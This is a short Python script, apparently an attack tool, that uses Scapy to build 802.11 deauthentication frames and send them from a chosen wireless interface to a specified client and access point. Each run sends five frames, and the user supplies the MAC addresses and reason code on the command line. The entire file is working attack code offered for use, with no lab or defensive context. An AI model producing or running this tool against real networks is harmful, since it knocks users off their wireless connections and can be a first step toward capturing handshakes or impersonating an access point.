# Import necessary modules from Scapy library
from scapy.all import *
# Import argparse for parsing command-line arguments
import argparse

# Define a function to send a deauthentication packet
def send_deauth_packet(interface, ap_mac, client_mac, reason_code):
    # Create a deauthentication packet using Scapy's RadioTap, Dot11, and Dot11Deauth layers
    deauth_packet = RadioTap() / Dot11(
        type=0, subtype=12, addr1=client_mac, addr2=ap_mac, addr3=ap_mac
    ) / Dot11Deauth(reason=reason_code)

    # Send the deauthentication packet using Scapy's sendp function, sending it 5 times with a 0.1 second interval between each
    sendp(deauth_packet, iface=interface, count=5, inter=0.1)

# Set up argparse to parse command-line arguments
parser = argparse.ArgumentParser(description="Send 802.11 deauthentication frames")
parser.add_argument("interface", help="Interface to use for sending packets")
parser.add_argument("ap_mac", help="MAC address of the access point")
parser.add_argument("client_mac", help="MAC address of the client")
parser.add_argument(
    "reason_code",
    type=int,
    choices=[1, 4, 5, 8],
    help="Reason code for deauthentication (1, 4, 5, or 8)",
)

# Parse the command-line arguments
args = parser.parse_args()

# Call the send_deauth_packet function with the parsed arguments
send_deauth_packet(args.interface, args.ap_mac, args.client_mac, args.reason_code)
